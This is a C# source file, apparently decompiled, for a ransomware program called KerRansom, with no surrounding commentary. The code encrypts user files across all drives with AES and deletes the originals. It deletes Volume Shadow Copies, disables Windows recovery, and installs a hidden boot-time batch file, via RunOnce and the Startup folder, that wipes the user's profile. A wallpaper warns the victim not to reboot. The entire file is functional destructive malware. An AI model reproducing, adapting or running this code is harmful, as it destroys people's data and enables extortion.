using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

internal class KerRansom
{
	private static readonly string[] TARGET_EXTENSIONS = new string[47]
	{
		".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".jpeg",
		".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi", ".mkv", ".zip", ".rar", ".7z",
		".tar", ".gz", ".sql", ".db", ".py", ".js", ".html", ".css", ".php", ".java",
		".c", ".cpp", ".cs", ".go", ".rs", ".json", ".xml", ".yml", ".yaml", ".cfg",
		".ini", ".log", ".bak", ".backup", ".key", ".pem", ".crt"
	};

	private static readonly object _lock = new object();

	private static List<string[]> _encryptedFiles = new List<string[]>();

	private static byte[] _key;

	private static byte[] _iv;

	private static string _baseDir;

	[DllImport("user32.dll")]
	private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	[DllImport("kernel32.dll")]
	private static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);

	private static void Main()
	{
		_key = new byte[32];
		_iv = new byte[16];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(_key);
			rNGCryptoServiceProvider.GetBytes(_iv);
		}
		_baseDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".cache_" + Guid.NewGuid().ToString("N").Substring(0, 8));
		Directory.CreateDirectory(_baseDir);
		SetFileAttributes(_baseDir, 2u);
		string[] skipDirs = new string[11]
		{
			"Windows", "System32", "SysWOW64", "Program Files", "Program Files (x86)", "ProgramData", "$Recycle.Bin", "AppData", "node_modules", ".git",
			"__pycache__"
		};
		List<string> drives = GetDrives();
		List<Thread> list = new List<Thread>();
		foreach (string item in drives)
		{
			string d = item;
			Thread thread = new Thread((ThreadStart)delegate
			{
				WalkAndEncrypt(d, skipDirs);
			});
			thread.Start();
			list.Add(thread);
		}
		foreach (Thread item2 in list)
		{
			item2.Join();
		}
		DeleteShadows();
		DisableRecovery();
		MakeUnlockBat();
		InstallWipeOnBoot();
		SetWallpaper();
	}

	private static List<string> GetDrives()
	{
		List<string> list = new List<string>();
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			foreach (string text in logicalDrives)
			{
				try
				{
					if (Directory.Exists(text))
					{
						list.Add(text);
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		if (list.Count == 0)
		{
			list.Add("/");
		}
		return list;
	}

	private static bool IsTarget(string ext)
	{
		string[] tARGET_EXTENSIONS = TARGET_EXTENSIONS;
		foreach (string a in tARGET_EXTENSIONS)
		{
			if (string.Equals(a, ext, StringComparison.OrdinalIgnoreCase))
			{
				return true;
			}
		}
		return false;
	}

	private static void WalkAndEncrypt(string root, string[] skipDirs)
	{
		try
		{
			string[] directories = Directory.GetDirectories(root);
			foreach (string text in directories)
			{
				string fileName = Path.GetFileName(text);
				bool flag = false;
				foreach (string a in skipDirs)
				{
					if (string.Equals(a, fileName, StringComparison.OrdinalIgnoreCase))
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					WalkAndEncrypt(text, skipDirs);
				}
			}
			directories = Directory.GetFiles(root);
			foreach (string text2 in directories)
			{
				try
				{
					string extension = Path.GetExtension(text2);
					if (IsTarget(extension))
					{
						EncryptFile(text2);
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private static void EncryptFile(string filepath)
	{
		try
		{
			byte[] array = File.ReadAllBytes(filepath);
			byte[] bytes;
			using (Aes aes = Aes.Create())
			{
				aes.Key = _key;
				aes.IV = _iv;
				aes.Mode = CipherMode.CBC;
				aes.Padding = PaddingMode.PKCS7;
				using ICryptoTransform cryptoTransform = aes.CreateEncryptor();
				bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			}
			string text = filepath + ".ker";
			File.WriteAllBytes(text, bytes);
			try
			{
				File.Delete(filepath);
			}
			catch
			{
			}
			lock (_lock)
			{
				_encryptedFiles.Add(new string[2] { text, filepath });
			}
		}
		catch
		{
		}
	}

	private static void DeleteShadows()
	{
		RunHidden("vssadmin", "delete shadows /all /quiet");
		RunHidden("wmic", "shadowcopy delete");
	}

	private static void DisableRecovery()
	{
		RunHidden("bcdedit", "/set {default} recoveryenabled No");
		RunHidden("bcdedit", "/set {default} bootstatuspolicy ignoreallfailures");
		RunHidden("reagentc", "/disable");
	}

	private static void RunHidden(string file, string args)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(file, args);
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
		}
		catch
		{
		}
	}

	private static void MakeUnlockBat()
	{
		string text = Convert.ToBase64String(_key);
		string text2 = Convert.ToBase64String(_iv);
		string path = Path.Combine(_baseDir, "list.dat");
		lock (_lock)
		{
			using StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			foreach (string[] encryptedFile in _encryptedFiles)
			{
				streamWriter.WriteLine(encryptedFile[0] + "|" + encryptedFile[1]);
			}
		}
		string path2 = Path.Combine(_baseDir, "dec.cs");
		string contents = "\r\nusing System;\r\nusing System.IO;\r\nusing System.Security.Cryptography;\r\nclass Dec {\r\n    static void Main() {\r\n        string b = AppDomain.CurrentDomain.BaseDirectory;\r\n        byte[] k = Convert.FromBase64String(\"" + text + "\");\r\n        byte[] iv = Convert.FromBase64String(\"" + text2 + "\");\r\n        string listPath = Path.Combine(b, \"list.dat\");\r\n        if (!File.Exists(listPath)) { Console.WriteLine(\"No list.\"); return; }\r\n        string[] lines = File.ReadAllLines(listPath);\r\n        int ok = 0, fail = 0;\r\n        foreach (string line in lines) {\r\n            if (string.IsNullOrWhiteSpace(line)) continue;\r\n            int sep = line.IndexOf('|');\r\n            if (sep < 0) continue;\r\n            string enc = line.Substring(0, sep);\r\n            string orig = line.Substring(sep + 1);\r\n            try {\r\n                byte[] data = File.ReadAllBytes(enc);\r\n                byte[] dec;\r\n                using (Aes a = Aes.Create()) {\r\n                    a.Key = k; a.IV = iv;\r\n                    a.Mode = CipherMode.CBC;\r\n                    a.Padding = PaddingMode.PKCS7;\r\n                    using (ICryptoTransform d = a.CreateDecryptor())\r\n                        dec = d.TransformFinalBlock(data, 0, data.Length);\r\n                }\r\n                File.WriteAllBytes(orig, dec);\r\n                File.Delete(enc);\r\n                ok++;\r\n            } catch { fail++; }\r\n        }\r\n        Console.WriteLine(\"Restored: \" + ok + \" Failed: \" + fail);\r\n    }\r\n}";
		File.WriteAllText(path2, contents, Encoding.UTF8);
		string text3 = Path.Combine(_baseDir, "bat.bat");
		using (StreamWriter streamWriter = new StreamWriter(text3, append: false, Encoding.ASCII))
		{
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("cd /d \"" + _baseDir + "\"");
			streamWriter.WriteLine("set CSC=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe");
			streamWriter.WriteLine("if not exist \"%CSC%\" set CSC=C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe");
			streamWriter.WriteLine("if exist \"%CSC%\" (\"%CSC%\" /nologo /out:dec.exe dec.cs >nul 2>&1)");
			streamWriter.WriteLine("if exist dec.exe (dec.exe) else (echo Compile failed, use manual recovery)");
			streamWriter.WriteLine("shutdown /a");
			streamWriter.WriteLine("pause");
			streamWriter.WriteLine("exit");
		}
		SetFileAttributes(text3, 2u);
		string path3 = Path.Combine(_baseDir, "dec.ps1");
		string contents2 = "$key = [Convert]::FromBase64String('" + text + "')\n$iv = [Convert]::FromBase64String('" + text2 + "')\n$base = Split-Path -Parent $MyInvocation.MyCommand.Path\n$list = Join-Path $base 'list.dat'\nGet-Content $list | ForEach-Object {\n  $p = $_ -split '\\|'\n  if ($p.Count -ne 2) { return }\n  try {\n    $data = [IO.File]::ReadAllBytes($p[0])\n    $aes = [Security.Cryptography.Aes]::Create()\n    $aes.Key = $key; $aes.IV = $iv\n    $dec = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)\n    [IO.File]::WriteAllBytes($p[1], $dec)\n    Remove-Item $p[0]\n  } catch {}\n}\n";
		File.WriteAllText(path3, contents2, Encoding.UTF8);
	}

	private static void InstallWipeOnBoot()
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".cache_wipe");
		Directory.CreateDirectory(text);
		SetFileAttributes(text, 2u);
		string text2 = Path.Combine(text, "wipe.bat");
		using (StreamWriter streamWriter = new StreamWriter(text2, append: false, Encoding.ASCII))
		{
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("for /r \"%USERPROFILE%\" %%f in (*.ker) do (");
			streamWriter.WriteLine("  cipher /w:\"%%~dpf\" >nul 2>&1");
			streamWriter.WriteLine("  del /f /q \"%%f\" >nul 2>&1");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("for /r \"%USERPROFILE%\" %%f in (*.*) do (");
			streamWriter.WriteLine("  if not \"%%~xf\"==\".ker\" del /f /q \"%%f\" >nul 2>&1");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("del /f /q \"" + text2 + "\"");
		}
		SetFileAttributes(text2, 2u);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
			registryKey?.SetValue("WipeOnBoot", "\"" + text2 + "\"");
		}
		catch
		{
		}
		try
		{
			string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "wipe.bat");
			using (StreamWriter streamWriter = new StreamWriter(text3, append: false, Encoding.ASCII))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("start \"\" \"" + text2 + "\"");
				streamWriter.WriteLine("del /f /q \"" + text3 + "\"");
			}
			SetFileAttributes(text3, 2u);
		}
		catch
		{
		}
	}

	private static void SetWallpaper()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		try
		{
			int num = 1920;
			int num2 = 1080;
			Bitmap val = new Bitmap(num, num2);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.Clear(Color.Black);
					Font val3 = new Font("Arial", 160f, (FontStyle)1);
					try
					{
						Font val4 = new Font("Arial", 32f, (FontStyle)0);
						try
						{
							Brush val5 = (Brush)new SolidBrush(Color.White);
							try
							{
								string text = "OPS...";
								string text2 = "Don't reboot your pc or your files will delete.";
								SizeF sizeF = val2.MeasureString(text, val3);
								SizeF sizeF2 = val2.MeasureString(text2, val4);
								val2.DrawString(text, val3, val5, ((float)num - sizeF.Width) / 2f, ((float)num2 - sizeF.Height) / 2f - 80f);
								val2.DrawString(text2, val4, val5, ((float)num - sizeF2.Width) / 2f, ((float)num2 - sizeF2.Height) / 2f + 120f);
							}
							finally
							{
								((IDisposable)val5)?.Dispose();
							}
						}
						finally
						{
							((IDisposable)val4)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
					string text3 = Path.Combine(Path.GetTempPath(), "wall.bmp");
					((Image)val).Save(text3, ImageFormat.Bmp);
					SystemParametersInfo(20u, 0u, text3, 3u);
					using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
					if (registryKey != null)
					{
						registryKey.SetValue("Wallpaper", text3);
						registryKey.SetValue("WallpaperStyle", "10");
						registryKey.SetValue("TileWallpaper", "0");
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
